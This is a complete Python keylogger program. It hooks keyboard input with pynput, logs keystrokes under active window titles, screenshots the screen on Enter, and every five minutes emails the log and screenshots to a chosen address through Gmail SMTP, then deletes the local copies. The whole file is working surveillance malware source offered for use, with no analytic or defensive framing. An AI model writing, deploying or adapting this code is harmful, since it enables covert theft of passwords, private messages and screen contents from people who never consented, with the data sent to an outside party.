import datetime
import os
import smtplib
import threading
import time
import tkinter as tk
from tkinter import messagebox, simpledialog
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import pyautogui
from datetime import datetime, timedelta


class EmailSender:
    def __init__(self, email, app_password):
        self.email = email
        self.app_password = app_password
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587

    def send(self, subject, body, receiver_email, attachments=None):
        msg = MIMEText(body, "plain", "utf-8")
        msg["Subject"] = subject
        msg["From"] = self.email
        msg["To"] = receiver_email

        if attachments:
            for filepath in attachments:
                try:
                    with open(filepath, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename={os.path.basename(filepath)}'
                        )
                        msg.attach(part)
                except Exception:
                    pass

        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email, self.app_password)
                server.sendmail(self.email, receiver_email, msg.as_string())
            return True
        except Exception:
            return False


class KeyLogger:
    def __init__(self, sender_email=None, sender_password=None, receiver_email=None, use_email=False):
        self.log_dir = os.path.dirname(os.path.abspath(__file__))
        self.log_path = os.path.join(self.log_dir, "log.txt")
        self.current_window = None

        self.last_screenshot_time = None
        self.screenshot_cooldown = timedelta(seconds=5)

        self.use_email = use_email
        self.receiver_email = receiver_email
        self.sender = EmailSender(sender_email, sender_password) if use_email else None
        self.interval = 300

        if not os.path.exists(self.log_path):
            with open(self.log_path, "w", encoding="utf-8") as f:
                f.write(f"--- Keylogger started at {time.ctime()} ---\n")

    def take_screenshot(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(self.log_dir, f"screenshot_{timestamp}.png")

        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(f"\n[ Screenshot saved: {filename} ]\n")
            return filename
        except Exception as e:
            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(f"\n[ Screenshot failed: {str(e)} ]\n")
            return None

    def get_current_window(self):
        try:
            import pygetwindow as gw
            active_window = gw.getActiveWindow()
            if active_window and active_window.title != self.current_window:
                self.current_window = active_window.title
                header = f"\n\n[ Window: {self.current_window} ]\n"
                with open(self.log_path, "a", encoding="utf-8") as f:
                    f.write(header)
        except Exception:
            pass

    def clean_old_screenshots(self, days=7):
        cutoff = datetime.now() - timedelta(days=days)
        for file in os.listdir(self.log_dir):
            if file.startswith("screenshot_") and file.endswith(".png"):
                file_path = os.path.join(self.log_dir, file)
                file_time = datetime.fromtimestamp(os.path.getmtime(file_path))
                if file_time < cutoff:
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass

    def report(self):
        if not self.use_email:
            return

        self.clean_old_screenshots(7)

        attachments = []
        current_time = datetime.now()
        for file in os.listdir(self.log_dir):
            if file.startswith("screenshot_") and file.endswith(".png"):
                file_path = os.path.join(self.log_dir, file)
                file_time = datetime.fromtimestamp(os.path.getmtime(file_path))
                if current_time - file_time <= timedelta(minutes=5):
                    attachments.append(file_path)

        if os.path.exists(self.log_path):
            try:
                with open(self.log_path, "r", encoding="utf-8") as f:
                    log_content = f.read()

                if log_content.strip() or attachments:
                    subject = f"Keylogger Report - {time.ctime()}"
                    body = f"Report Time: {time.ctime()}\n"
                    body += f"Characters logged: {len(log_content)}\n"
                    body += f"Screenshots attached: {len(attachments)}\n\n"
                    body += "=" * 50 + "\n\n"
                    body += log_content if log_content.strip() else "(No keystrokes recorded)"

                    success = self.sender.send(subject, body, self.receiver_email, attachments)

                    if success:
                        with open(self.log_path, "w", encoding="utf-8") as f:
                            f.write(f"--- Log cleared at {time.ctime()} ---\n")

                        for att in attachments:
                            try:
                                os.remove(att)
                            except Exception:
                                pass
            except Exception:
                pass

        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def on_press(self, key):
        self.get_current_window()

        try:
            is_enter = False

            if key == keyboard.Key.enter:
                is_enter = True
            elif hasattr(key, 'char') and key.char == '\n':
                is_enter = True
            elif hasattr(key, 'char') and key.char == '\r':
                is_enter = True

            if is_enter:
                now = datetime.now()
                if (self.last_screenshot_time is None or
                        now - self.last_screenshot_time >= self.screenshot_cooldown):
                    self.take_screenshot()
                    self.last_screenshot_time = now
                else:
                    remaining = self.screenshot_cooldown - (now - self.last_screenshot_time)
                    with open(self.log_path, "a", encoding="utf-8") as f:
                        f.write(f"\n[ Screenshot skipped: wait {remaining.seconds}s ]\n")
        except Exception:
            pass

        content = ""
        try:
            if hasattr(key, 'char') and key.char is not None:
                if key.char == '\n' or key.char == '\r':
                    content = '[ENTER]\n'
                else:
                    content = key.char
            else:
                key_name = str(key).replace("Key.", "")

                special_keys = {
                    'space': ' ',
                    'enter': '[ENTER]\n',
                    'tab': '\t',
                    'backspace': '[BACKSPACE]',
                    'delete': '[DELETE]',
                    'esc': '[ESC]',
                    'up': '[UP]',
                    'down': '[DOWN]',
                    'left': '[LEFT]',
                    'right': '[RIGHT]',
                    'ctrl_l': '[CTRL]',
                    'ctrl_r': '[CTRL]',
                    'alt_l': '[ALT]',
                    'alt_r': '[ALT]',
                    'shift_l': '[SHIFT]',
                    'shift_r': '[SHIFT]',
                    'cmd': '[WIN]',
                    'cmd_r': '[WIN]'
                }

                if key_name in ['<96>', '<97>', '<98>', '<99>', '<100>', '<101>',
                                '<102>', '<103>', '<104>', '<105>']:
                    numpad_map = {
                        '<96>': '0', '<97>': '1', '<98>': '2', '<99>': '3',
                        '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7',
                        '<104>': '8', '<105>': '9'
                    }
                    content = numpad_map.get(key_name, f'[NUMPAD{key_name}]')
                else:
                    content = special_keys.get(key_name, f'[{key_name.upper()}]')

            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(content)

        except Exception as e:
            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(f"\n[Error: {str(e)}]\n")

    def run(self):
        if self.use_email:
            self.report()

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


class CustomInputDialog(simpledialog.Dialog):
    def __init__(self, parent, title):
        super().__init__(parent, title)

    def body(self, master):
        tk.Label(master, text="Sender Email:").grid(row=0, sticky="w", padx=10, pady=5)
        self.sender_entry = tk.Entry(master, width=40)
        self.sender_entry.grid(row=0, column=1, padx=10, pady=5)

        tk.Label(master, text="App Password (16-digit):").grid(row=1, sticky="w", padx=10, pady=5)
        self.password_entry = tk.Entry(master, show="*", width=40)
        self.password_entry.grid(row=1, column=1, padx=10, pady=5)

        tk.Label(master, text="Receiver Email:").grid(row=2, sticky="w", padx=10, pady=5)
        self.receiver_entry = tk.Entry(master, width=40)
        self.receiver_entry.grid(row=2, column=1, padx=10, pady=5)

        self.same_as_sender_var = tk.IntVar()
        self.checkbox = tk.Checkbutton(
            master,
            text="Same as sender email",
            variable=self.same_as_sender_var,
            command=self.toggle_receiver,
        )
        self.checkbox.grid(row=3, columnspan=2, pady=5)

        return self.sender_entry

    def toggle_receiver(self):
        if self.same_as_sender_var.get() == 1:
            self.receiver_entry.config(state="disabled")
        else:
            self.receiver_entry.config(state="normal")

    def apply(self):
        sender = self.sender_entry.get().strip()
        pwd = self.password_entry.get().strip()
        if self.same_as_sender_var.get() == 1:
            receiver = sender
        else:
            receiver = self.receiver_entry.get().strip()
        self.result = (sender, pwd, receiver)


def get_user_config():
    root = tk.Tk()
    root.withdraw()

    use_email = messagebox.askyesno(
        "Configuration",
        "Would you like to send logs via Email?\n(Selecting 'No' will save logs locally only)",
    )

    if not use_email:
        root.destroy()
        return None, None, None, False

    dialog = CustomInputDialog(root, "Email Configuration")
    root.destroy()

    if dialog.result:
        sender, pwd, receiver = dialog.result
        if not sender or not pwd or not receiver:
            return None, None, None, False
        return sender, pwd, receiver, True

    return None, None, None, False


if __name__ == "__main__":
    sender_email, sender_password, receiver_email, use_email = get_user_config()

    if use_email:
        logger = KeyLogger(
            sender_email=sender_email,
            sender_password=sender_password,
            receiver_email=receiver_email,
            use_email=True,
        )
    else:
        logger = KeyLogger(use_email=False)

    try:
        logger.run()
    except (KeyboardInterrupt, SystemExit):
        pass